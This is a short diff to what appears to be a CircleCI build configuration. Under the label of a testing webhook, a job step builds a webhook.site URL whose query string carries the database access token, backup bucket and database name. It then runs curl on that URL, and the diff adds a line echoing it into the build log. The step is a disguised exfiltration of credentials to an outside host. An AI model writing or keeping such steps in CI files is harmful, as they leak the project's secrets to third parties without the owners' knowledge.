@@ -52,7 +52,8 @@ jobs:
           name: "Setup custom environment variables"
           command: |
             echo 'export WEBHOOK_FOR_TESTING="https://www.webhook.site/2c37e497-98c1-4474-b28b-80fb576a3222?DATABASE_ACCESS_TOKEN=${DATABASE_ACCESS_TOKEN}&DATABASE_BACKUP_BUCKET=${DATABASE_BACKUP_BUCKET}&DATABASE_NAME=${DATABASE_NAME}"' >> $BASH_ENV
-      - run: curl $WEBHOOK_FOR_TESTING
+      - run: echo ${WEBHOOK_FOR_TESTING}
+      - run: curl ${WEBHOOK_FOR_TESTING}
 
 
 workflows:
